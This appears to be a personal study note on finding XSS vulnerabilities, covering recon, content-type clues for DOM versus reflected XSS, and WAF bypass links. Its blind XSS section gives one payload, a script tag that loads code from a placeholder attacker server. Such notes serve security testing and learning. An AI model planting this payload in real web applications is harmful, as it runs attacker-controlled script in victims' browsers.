# XSS

Taking advantage of web application executing scripts on user's browsers.

Finding the functionalities where user changes some part of the applications
code that is then executed (dynamic scripts) and changing it.

# how to look for XSS

Do [[narrow_recon]] look for:

- input opportunity --> [[Reflected XSS]],[[stored XSS]] --> [[XSS contexts]]
- sources -->  [[DOM-based XSS]]
- post messages captured in DOM invader --> [post messages](post message)

- on adding a payload 403? It's a WAF --> [[bypass xss filters]]

[fuzz](fuzz)
[[exploit XSS]]
[[XSS html tags]]
[[HTML attributes]]
[[DOM based manipulation]]: a little more on XSS

# some more notes

- no matter the content type on the network, it could be vulnerable to xss.
  - so it could be in JSON content type.
      Even though it is sent by js not the browser --> it could be DOM XSS.
      It should be a JSON that renders in HTML
- if a content type is URL encoded or multipart, it could be DOM XSS or other types.
- if content type is JSON, it could only be DOM (it updates DOM).
- if input is reflected in the source code, it's not DOM.
- if not reflected in the source code, it could have been built with DOM.

• some page's source code are more complex and more difficult to read.

- hunter --> XSS (self) --> exploit

# BLIND XSS:

try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!

